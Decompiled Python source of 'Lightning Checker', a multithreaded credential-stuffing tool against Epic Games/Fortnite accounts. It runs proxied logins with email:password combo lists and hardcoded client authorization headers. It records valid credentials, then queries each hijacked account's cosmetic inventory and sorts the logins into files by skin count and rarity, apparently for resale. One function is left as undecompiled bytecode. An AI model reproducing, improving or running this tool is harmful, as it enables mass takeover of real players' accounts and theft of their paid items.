# uncompyle6 version 3.7.4
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.6.15 (default, Sep 28 2021, 20:18:52) 
# [GCC 10.2.1 20210110]
# Embedded file name: narcis.py
import pypresence, time
from pypresence import Presence
import os, subprocess, requests
from colorama import *
import getpass, sys, paramiko, os, random, threading, time
from time import strftime, gmtime
import tkinter
from tkinter import filedialog
from pypresence import Presence
import pypresence, requests
from colorama import Fore
import urllib3, traceback, logging
from requests.exceptions import ProxyError
alb = Fore.WHITE
init()
rosu = Fore.RED
verde = Fore.GREEN
version = 'v0.2'
logo = f"{Fore.WHITE}  \n _    _      _   _        _              ___ _           _           \n| |  (_)__ _| |_| |_ _ _ (_)_ _  __ _   / __| |_  ___ __| |_____ _ _ \n| |__| / _` | ' \\  _| ' \\| | ' \\/ _` | | (__| ' \\/ -_) _| / / -_) '_|\n|____|_\\__, |_||_\\__|_||_|_|_||_\\__, |  \\___|_||_\\___\\__|_\\_\\___|_|  \n       |___/                    |___/                            \n                                                                                            \n                                                                       Version: {version}                   "
urllib3.disable_warnings()
toate = 0
defaults = 0
rares = 0
foldername = strftime('%Y_%m_%d_%H_%M_%S', gmtime())
rare = ['AthenaPickaxe:pickaxe_lockjaw', 'AthenaPickaxe:pickaxe_id_294_candycane', 'AthenaCharacter:cid_174_athena_commando_f_carbidewhite', 'AthenaCharacter:cid_313_athena_commando_m_kpopfashion', ' AthenaCharacter:cid_479_athena_commando_f_davinci',
 'AthenaCharacter:cid_022_athena_commando_f', 'AthenaCharacter:cid_032_athena_commando_m_medieval', 'AthenaCharacter:cid_033_athena_commando_f_medieval', 'AthenaCharacter:cid_035_athena_commando_m_medieval', 'AthenaCharacter:cid_039_athena_commando_f_disco',
 'AthenaCharacter:cid_017_athena_commando_m', 'AthenaCharacter:cid_028_athena_commando_f', 'AthenaCharacter:cid_051_athena_commando_m_holidayelf', 'AthenaCharacter:cid_175_athena_commando_m_celestial']
bimport = []
skinlist = {}
skinlist1 = requests.get('http://robert832.me/lista_skins')
for a in skinlist1.iter_lines():
    bimport.append(str(a.decode(encoding='UTF-8', errors='strict')))

for each in bimport:
    try:
        c = each.split('|')
        skinlist[c[0]] = c[1]
    except:
        continue

cimport = []
axelist = {}
axelist1 = requests.get('http://robert832.me/lista_axe')
for ab in axelist1.iter_lines():
    cimport.append(str(ab.decode(encoding='UTF-8', errors='strict')))

for each1 in cimport:
    d = each1.split('|')
    axelist[d[0]] = d[1]

if not os.path.exists('results'):
    os.makedirs('results')
if not os.path.exists(f"results/{foldername}"):
    os.makedirs(f"results/{foldername}")
if not os.path.exists(f"results/{foldername}/incrementals"):
    os.makedirs(f"results/{foldername}/incrementals")
alb = Fore.WHITE
rosu = Fore.RED
verde = Fore.GREEN
init()
clear = lambda : os.system('cls')

def login():
    alb = Fore.WHITE
    rosu = Fore.RED
    verde = Fore.GREEN
    ann = 'discord.gg/LightningChecker'
    cont = '61E38884-95BA-11E3-B650-B60F1C2D1300'
    hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
    clear()
    os.system('Login / made by xNRS')
    print(logo)
    print('\n')
    print(f" {alb}<{rosu}{Fore.RED}Announcement{alb}> {ann}")
    print('\n\n')
    if cont == hwid:
        pass
    else:
        print('')
        print(f"{alb} <{rosu}Lightning Checker{alb}>{rosu} Invalid HWID.")
        print(f"{alb} <{rosu}Lightning Checker{alb}>{rosu} Contact an admin for HWID reset or buy {Fore.WHITE}Hans Checker")
        time.sleep(5)
        sys.exit(0)
        exit()


login()
num = 0
what_line_is = 0
CPM = 0
CPM1 = 0
Bad = 0
Banned = 0
good_hits = 0
two_Factor = 0
Checked = 0
erorrr = 0
emailVerified = 0
locked_acc = 0
als = []
root = tkinter.Tk()
root.withdraw()
os.system('cls')

def get_Session(proxies):
    api_sender = requests.session()
    prxi = proxies.split(':')
    if len(prxi) == 2:
        api_sender.proxies = {'https': proxies}
        return api_sender
    if len(prxi) == 4:
        api_sender.proxies = {'https': f"http://{prxi[2]}:{prxi[3]}@{prxi[0]}:{prxi[1]}"}
        return api_sender
    api_sender = 'broken'
    return api_sender


def GetProxies():
    file = filedialog.askopenfile(parent=root, mode='rb', title='Choose a proxy file (http/s)', filetype=(('txt', '*.txt'),
                                                                                                          ('All files', '*.txt')))
    if file is not None:
        try:
            loadedFile = open(file.name).readlines()
            arrange = [lines.replace('\n', '') for lines in loadedFile]
        except ValueError:
            try:
                loadedFilee = open((file.name), encoding='utf-8').readlines()
                arrange1 = [lines.replace('\n', '') for lines in loadedFilee]
            except ValueError:
                print(Fore.WHITE + 'Cannot open file, Unsupported encoding.')
            else:
                return arrange1
        else:
            return arrange
    else:
        print(Fore.WHITE + 'No file Chosen')


def start--- This code section failed: ---

 L. 155         0  LOAD_GLOBAL              show_on
                2  CALL_FUNCTION_0       0  '0 positional arguments'
                4  POP_TOP          

 L. 157         6  SETUP_LOOP           58  'to 58'
              8_0  COME_FROM            26  '26'
              8_1  COME_FROM            18  '18'

 L. 158         8  LOAD_GLOBAL              threading
               10  LOAD_METHOD              active_count
               12  CALL_METHOD_0         0  '0 positional arguments'
               14  LOAD_GLOBAL              Threads
               16  COMPARE_OP               <
               18  POP_JUMP_IF_FALSE     8  'to 8'

 L. 159        20  LOAD_FAST                'amount'
               22  LOAD_GLOBAL              num
               24  COMPARE_OP               >
               26  POP_JUMP_IF_FALSE     8  'to 8'

 L. 160        28  LOAD_GLOBAL              threading
               30  LOAD_ATTR                Thread
               32  LOAD_GLOBAL              thread
               34  LOAD_CONST               ()
               36  LOAD_CONST               ('target', 'args')
               38  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
               40  LOAD_METHOD              start
               42  CALL_METHOD_0         0  '0 positional arguments'
               44  POP_TOP          

 L. 161        46  LOAD_GLOBAL              num
               48  LOAD_CONST               1
               50  INPLACE_ADD      
               52  STORE_GLOBAL             num
               54  JUMP_BACK             8  'to 8'
               56  POP_BLOCK        
             58_0  COME_FROM_LOOP        6  '6'

Parse error at or near `POP_BLOCK' instruction at offset 56


print('\n')
print(logo)
print('\n' + Fore.LIGHTRED_EX + '                                                Lightning Checker [Menu]    \n')
print('\n')
Threads = int(input(alb + f" <{rosu}Lightning Checker{alb}>" + Fore.WHITE + ' Select number of threads: ' + Fore.WHITE))
print('\n')
print((alb + f" <{rosu}Lightning Checker{alb}>" + Fore.WHITE + ' Select Proxy file: '), end='')
proxies = GetProxies()
print(Fore.WHITE + 'Proxies added.')
print('\n')
print((alb + f" <{rosu}Lightning Checker{alb}>" + Fore.WHITE + ' Select Combo file: '), end='')
file = filedialog.askopenfile(parent=root, mode='rb', title='Choose Combo File', filetype=(('txt', '*.txt'),
                                                                                           ('All files', '*.txt')))
combo = open(file.name).readlines()
print(Fore.WHITE + f"{int(len(combo))} lines ready to check")
time.sleep(2)
arrange = [lines.replace('\n', '') for lines in combo]
os.system('title Checking bombos')

def skin_checker(usern, passw):
    global defaults
    global foldername
    global rares
    global toate
    sess1 = requests.session()
    try:
        api_xrsf = sess1.get('https://www.epicgames.com/id/api/csrf')
        xsrf_cookie_tok = api_xrsf.cookies.get('XSRF-TOKEN')
        epic_sess_id_tok = api_xrsf.cookies.get('EPIC_SESSION_ID')
        epic_sso_tok = api_xrsf.cookies.get('EPIC_SSO_SESSION')
        epic_funnel_tok = api_xrsf.cookies.get('EPIC_FUNNEL_ID')
        epic_device_took = api_xrsf.cookies.get('EPIC_DEVICE')
        muid_took = api_xrsf.cookies.get('MUID')
        sailthru_took = api_xrsf.cookies.get('sailthru_hid')
        ajs_anony_took = api_xrsf.cookies.get('ajs_anonymous_id')
        epic_SID_took = api_xrsf.cookies.get('_epicSID')
        data = {'email':usern, 
         'password':passw, 
         'rememberMe':True}
        headers = {'authority':'www.epicgames.com', 
         'Authorization':'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=', 
         'method':'POST', 
         'accept':'application/json, text/plain, */*', 
         'accept-encoding':'gzip, deflate, br', 
         'accept-language':'en-US,en;q=0.9', 
         'content-type':'application/json;charset=UTF-8', 
         'x-requested-with':'XMLHttpRequest', 
         'x-xsrf-token':xsrf_cookie_tok, 
         'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36', 
         'cookie':f"EPIC_COUNTRY=IL; EPIC_SESSION_ID={epic_sess_id_tok}; EPIC_SSO_SESSION={epic_sso_tok}; XSRF-TOKEN={xsrf_cookie_tok}; EPIC_FUNNEL_ID={epic_funnel_tok}; EPIC_DEVICE={epic_device_took}; epicCountry=IL; MUID={muid_took}; sailthru_hid={sailthru_took}; ajs_group_id=null; ajs_anonymous_id={ajs_anony_took}; EPIC_LOCALE_COOKIE=en-US; _epicSID={epic_SID_took}"}
        info_req = sess1.post('https://www.epicgames.com/id/api/login', json=data, headers=headers)
        if info_req.text == '':
            reqa = sess1.get('https://www.epicgames.com/id/api/exchange').json()
            codchange = reqa['code']
            q = sess1.post('https://account-public-service-prod03.ol.epicgames.com/account/api/oauth/token', headers={'Authorization': 'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE='}, data={'grant_type':'exchange_code', 
             'exchange_code':f"{codchange}",  'includePerms':True,  'token_type':'egl'}).json()
            tokennu = q['access_token']
            cont_id = q['account_id']
            cont = sess1.post(f"https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{cont_id}/client/QueryProfile?profileId=athena&rvn=-1", headers={'Authorization': 'bearer ' + tokennu}, json=data)
            c = []
            axe = 0
            skinnr = 0
            rarenr = 0
            skin_f = []
            axe_f = []
            rare_f = []
            for skin in cont.json()['profileChanges'][0]['profile']['items']:
                c.append(skin)

            for each in c:
                d = cont.json()['profileChanges'][0]['profile']['items'][(f"{each}")]['templateId']
                if 'AthenaPickaxe:' in d:
                    axe += 1
                    rare_f.append(each)
                    axe_f.append(each)
                elif 'AthenaCharacter:' in d:
                    skinnr += 1
                    skin_f.append(each)
                    rare_f.append(each)

            with open(f"results/{foldername}/Skinned.txt", 'a') as (salvez):
                am = [
                 '----------<Info>----------\n',
                 f"-> Account email: {usern}\n",
                 f"-> Account password: {passw}\n",
                 f"-> Account created at: {cont.json()['profileChanges'][0]['profile']['created']}\n",
                 '----------<Rares>----------\n']
                salvez.writelines(am)
                for salvez_rate in rare_f:
                    de_rare = cont.json()['profileChanges'][0]['profile']['items'][(f"{salvez_rate}")]['templateId']
                    if de_rare in rare:
                        try:
                            salvez.write(f"-> {de_rare}\n".replace(de_rare, skinlist[(f"{de_rare}")]))
                            rarenr += 1
                        except:
                            salvez.write(f"-> {de_rare}\n")
                            rarenr += 1

                        continue

                salvez.write(f"----------<Skins[{skinnr}]>----------\n")
                for salvez_skin in skin_f:
                    de_skin = cont.json()['profileChanges'][0]['profile']['items'][(f"{salvez_skin}")]['templateId']
                    try:
                        salvez.write(f"-> {de_skin}\n".replace(de_skin, skinlist[(f"{de_skin}")]))
                    except:
                        salvez.write(f"-> {de_skin}\n")

                salvez.write(f"----------<Pickaxes[{axe}]>----------\n")
                for salvez_axe in axe_f:
                    de_axe = cont.json()['profileChanges'][0]['profile']['items'][(f"{salvez_axe}")]['templateId']
                    try:
                        salvez.write(f"-> {de_axe}\n".replace(de_axe, axelist[(f"{de_axe}")]))
                    except:
                        salvez.write(f"-> {de_axe}\n")

                salvez.write('--------------------\n\n')
                if len(skin_f) <= 0:
                    with open(f"results/{foldername}/Defaults.txt", 'a') as (f):
                        f.write(f"{usern}:{passw}\n")
                        defaults += 1
                else:
                    toate += 1
                if 1 <= len(skin_f) <= 9:
                    with open(f"results/{foldername}/incrementals/1+.txt", 'a') as (f):
                        f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                else:
                    if 10 <= len(skin_f) <= 19:
                        with open(f"results/{foldername}/incrementals/10+.txt", 'a') as (f):
                            f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                    else:
                        if 20 <= len(skin_f) <= 29:
                            with open(f"results/{foldername}/incrementals/20+.txt", 'a') as (f):
                                f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                        else:
                            if 30 <= len(skin_f) <= 39:
                                with open(f"results/{foldername}/incrementals/30+.txt", 'a') as (f):
                                    f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                            else:
                                if 40 <= len(skin_f) <= 49:
                                    with open(f"results/{foldername}/incrementals/40+.txt", 'a') as (f):
                                        f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                                else:
                                    if len(skin_f) >= 50:
                                        with open(f"results/{foldername}/incrementals/50+.txt", 'a') as (f):
                                            f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                                    if rarenr != 0:
                                        with open(f"results/{foldername}/Rares.txt", 'a') as (f):
                                            f.write(f"{usern}:{passw} => {len(skin_f)}\n")
                                        rares += 1
        else:
            defaults += 1
            with open(f"results/{foldername}/Defaults.txt", 'a') as (f):
                f.write(f"{usern}:{passw}\n")
    except:
        defaults += 1
        with open(f"results/{foldername}/Defaults.txt", 'a') as (f):
            f.write(f"{usern}:{passw}\n")


def thread():
    global what_line_is
    what_line_is += 1
    combo = arrange[(what_line_is - 1)]
    ARR = combo.split(':')
    usern = ARR[0].strip()
    passw = ARR[1].strip()

    def again():
        global Bad
        global CPM1
        global Checked
        global erorrr
        global good_hits
        sess = get_Session(random.choice(proxies))
        try:
            api_xrsf = sess.get('https://www.epicgames.com/id/api/csrf')
            xsrf_cookie_tok = api_xrsf.cookies.get('XSRF-TOKEN')
            epic_sess_id_tok = api_xrsf.cookies.get('EPIC_SESSION_ID')
            epic_sso_tok = api_xrsf.cookies.get('EPIC_SSO_SESSION')
            epic_funnel_tok = api_xrsf.cookies.get('EPIC_FUNNEL_ID')
            epic_device_took = api_xrsf.cookies.get('EPIC_DEVICE')
            muid_took = api_xrsf.cookies.get('MUID')
            sailthru_took = api_xrsf.cookies.get('sailthru_hid')
            ajs_anony_took = api_xrsf.cookies.get('ajs_anonymous_id')
            epic_SID_took = api_xrsf.cookies.get('_epicSID')
            data = {'email':usern, 
             'password':passw, 
             'rememberMe':True}
            headers = {'authority':'www.epicgames.com', 
             'Authorization':'basic MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=', 
             'method':'POST', 
             'accept':'application/json, text/plain, */*', 
             'accept-encoding':'gzip, deflate, br', 
             'accept-language':'en-US,en;q=0.9', 
             'content-type':'application/json;charset=UTF-8', 
             'x-requested-with':'XMLHttpRequest', 
             'x-xsrf-token':xsrf_cookie_tok, 
             'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36', 
             'cookie':f"EPIC_COUNTRY=IL; EPIC_SESSION_ID={epic_sess_id_tok}; EPIC_SSO_SESSION={epic_sso_tok}; XSRF-TOKEN={xsrf_cookie_tok}; EPIC_FUNNEL_ID={epic_funnel_tok}; EPIC_DEVICE={epic_device_took}; epicCountry=IL; MUID={muid_took}; sailthru_hid={sailthru_took}; ajs_group_id=null; ajs_anonymous_id={ajs_anony_took}; EPIC_LOCALE_COOKIE=en-US; _epicSID={epic_SID_took}"}
            info_req = sess.post('https://www.epicgames.com/id/api/login', json=data, headers=headers)
            if info_req.text == '':
                Checked += 1
                good_hits += 1
                with open(f"results/{foldername}/Hits.txt", 'a+') as (f):
                    f.write(f"{usern}:{passw} \n")
                threading.Thread(target=skin_checker, args=(usern.strip(), passw.strip())).start()
            else:
                if info_req.json()['errorCode'] == 'errors.com.epicgames.common.throttled':
                    erorrr += 1
                    threading.Thread(target=again, args=()).start()
                else:
                    Checked += 1
                    Bad += 1
                    CPM1 += 1
        except:
            erorrr += 1
            threading.Thread(target=again, args=()).start()

    threading.Thread(target=again, args=()).start()


ammount_to_check = int(len(combo))
ann = "I'm the best"
ann2 = 'King Leamyy ($)'

def show_on():
    global CPM
    global CPM1
    global ammount_to_check
    os.system('cls')
    CPM = CPM1
    CPM1 = 0
    print(logo)
    print('\n\n')
    print(f" {alb}<{rosu}{Fore.RED}Lightning Checker{alb}> {ann}")
    print(f" {alb}<{rosu}{Fore.RED}Top Secret`{alb}> {ann2}")
    print()
    print('\n' + Fore.LIGHTBLUE_EX + '                                             Made by xNRS\n')
    print(Fore.WHITE + '[Threads]->' + Fore.LIGHTBLACK_EX + str(Threads))
    print(Fore.WHITE + '[Checked]->' + Fore.GREEN + str(Checked) + Fore.WHITE + '/' + str(ammount_to_check))
    print(Fore.WHITE + '[Valid]->' + Fore.LIGHTGREEN_EX + str(good_hits))
    print(Fore.WHITE + '[Invalid]->' + Fore.RED + str(Bad))
    print(Fore.WHITE + '[Skinned]->' + Fore.CYAN + str(toate))
    print(Fore.WHITE + '[Rares]->' + Fore.MAGENTA + str(rares))
    print(Fore.WHITE + '[Default]->' + Fore.YELLOW + str(defaults))
    print(Fore.WHITE + '[Errors]->' + Fore.LIGHTBLACK_EX + str(erorrr))
    print(Fore.WHITE + '[CPM]->' + Fore.BLUE + str(CPM * 60))
    time.sleep(1)
    threading.Thread(target=show_on, args=()).start()


start(ammount_to_check)
# global Banned ## Warning: Unused global
# global num ## Warning: Unused global